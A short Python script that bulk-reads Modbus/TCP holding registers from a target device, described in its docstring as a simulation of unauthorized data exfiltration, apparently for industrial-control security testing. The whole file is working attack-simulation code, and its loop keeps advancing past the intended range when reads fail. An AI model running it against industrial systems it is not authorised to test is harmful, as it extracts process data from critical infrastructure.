#!/usr/bin/env python
"""
read_bulk.py - Bulk-read holding registers from a Modbus/TCP target.

Reads large contiguous blocks of registers (125 per request, the Modbus max)
to simulate data exfiltration from an unauthorized source.

Usage:
    python read_bulk.py <target_ip> [start_reg] [total_regs] [port] [unit_id]

    python read_bulk.py 192.168.1.100
    python read_bulk.py 192.168.1.100 0 1000
    python read_bulk.py 192.168.1.100 0 500 502 1

Requires: pip install pymodbus
"""

import sys
from pymodbus.client import ModbusTcpClient

target = sys.argv[1]
start = int(sys.argv[2]) if len(sys.argv) > 2 else 0
total = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
port = int(sys.argv[4]) if len(sys.argv) > 4 else 502
unit = int(sys.argv[5]) if len(sys.argv) > 5 else 1

client = ModbusTcpClient(target, port=port, timeout=2)
if not client.connect():
    print(f"[!] Cannot connect to {target}:{port}")
    sys.exit(1)

print(f"[*] Bulk reading {total} registers starting at {start} from {target}:{port} unit={unit}\n")

MAX_PER_REQ = 125
addr = start
extracted = 0

while extracted < total:
    batch = min(MAX_PER_REQ, total - extracted)
    result = client.read_holding_registers(addr, count=batch, slave=unit)

    if result.isError():
        print(f"  [-] Addr {addr}: error ({result})")
    else:
        print(f"  [+] Addr {addr}-{addr + batch - 1}: read {batch} registers")
        extracted += batch

    addr += batch

client.close()
print(f"\n[*] Done - extracted {extracted}/{total} registers")
